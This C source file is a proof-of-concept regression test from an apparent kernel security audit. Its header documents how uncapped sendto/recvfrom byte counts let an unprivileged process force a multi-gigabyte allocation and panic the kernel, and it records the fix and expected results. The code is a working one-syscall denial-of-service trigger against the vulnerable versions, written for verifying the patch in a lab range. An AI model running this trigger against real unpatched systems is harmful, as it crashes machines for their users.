/* poc_sock_large_count.c — `sendto`/`recvfrom` uncapped allocation (2026-11-13
 * attack-audit follow-up, F-x86v-1 allocation class)
 *
 * THE BUG (fixed in 2.22.3). The SENDTO/RECVFROM dispatch arms validated the
 * user buffer with a CAPPED length — `check_user_ptr(buf, count.min(1 MiB))` —
 * but then allocated and copied the RAW `count` (a `u64` fully controlled by
 * the caller):
 *
 *     let mut data = copy_in_pub(a[1], a[2]);      // sendto
 *     let mut buf  = alloc::vec![0u8; a[2] as usize]; // recvfrom
 *
 * A process therefore needed only 1 MiB of mapped, faulted-in pages to make the
 * kernel request an arbitrary multi-gigabyte allocation. On a 1 GiB guest the
 * allocation fails and `panic = abort` takes the machine down: a one-syscall
 * DoS that is reachable from an unprivileged ring-3 process with a UDP socket.
 *
 * THE FIX. `abi::socket_payload_len(count, send)` is the single policy:
 *   * sendto: `count > 1 MiB` is `EMSGSIZE` (90) BEFORE any allocation — a
 *     datagram cannot be silently truncated, so oversized is an error;
 *   * recvfrom: the count is the caller's buffer CAPACITY, so it is truncated
 *     to 1 MiB; the kernel validates, allocates and copies exactly that range.
 * `sendmsg`/`recvmsg` do not exist in this kernel (no handlers, not in the
 * supported set), so there is no second copy of the pattern.
 *
 * EXPECTED RESULTS
 *   fixed kernel (2.22.3+):
 *       POC-SOCKCAP[send]: SURVIVED r=-1 errno=90     (EMSGSIZE)
 *       POC-SOCKCAP[recv]: SURVIVED r=-1 errno=11     (EAGAIN, 5 s no datagram)
 *     and the shell prompt returns after [autorun].
 *   vulnerable kernel (2.21.0/2.22.0):
 *       [PANIC] memory allocation of 4294967295 bytes failed
 *     and the machine is dead (no shell prompt).
 *
 * BUILD/RUN (needs the range's user-net for AF_INET sockets, see
 * tools/security/README.md):
 *   "$RANGE/cc-static" -O2 -o /tmp/poc_sockcap tools/security/poc/poc_sock_large_count.c
 *   cd /tmp/range-fixed && ./run.sh --net --expect 'POC-SOCKCAP\[send\]: SURVIVED r=-1 errno=90' /tmp/poc_sockcap send
 *   cd /tmp/range-fixed && ./run.sh --net --expect 'POC-SOCKCAP\[recv\]: SURVIVED r=-1 errno=11' /tmp/poc_sockcap recv
 */
#define _GNU_SOURCE
#include <errno.h>
#include <stdio.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <unistd.h>

int main(int argc, char **argv) {
    setgid(1000);
    setuid(1000);
    const char *mode = argc > 1 ? argv[1] : "recv";
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    printf("POC-SOCKCAP[%s]: uid=%d fd=%d errno=%d\n", mode, (int)getuid(), fd,
           errno);
    if (fd < 0) {
        printf("POC-SOCKCAP: cannot create a UDP socket (range needs --net)\n");
        return 1;
    }
    /* Exactly what the capped check validates: 1 MiB of mapped, faulted-in
     * pages. The raw count is then ~4 GiB — the vulnerable kernel allocates
     * that raw count, the fixed one caps it. */
    const size_t len = 1 << 20;
    char *buf = mmap(0, len, PROT_READ | PROT_WRITE,
                     MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (buf == MAP_FAILED) {
        printf("POC-SOCKCAP: mmap failed errno=%d\n", errno);
        return 1;
    }
    memset(buf, 0, len); /* fault the pages in: check_user_ptr needs PTEs */
    const unsigned long huge = 0xFFFFFFFFUL; /* ~4 GiB, u64 count */

    errno = 0;
    long r;
    if (strcmp(mode, "send") == 0) {
        /* No destination needed: the copy happens before the send. */
        r = sendto(fd, buf, huge, 0, NULL, 0);
        printf("POC-SOCKCAP[send]: SURVIVED r=%ld errno=%d\n", r, errno);
        return r == -1 && errno == EMSGSIZE ? 0 : 2;
    }
    r = recvfrom(fd, buf, huge, 0, NULL, NULL);
    printf("POC-SOCKCAP[recv]: SURVIVED r=%ld errno=%d\n", r, errno);
    return r == -1 && errno == EAGAIN ? 0 : 2;
}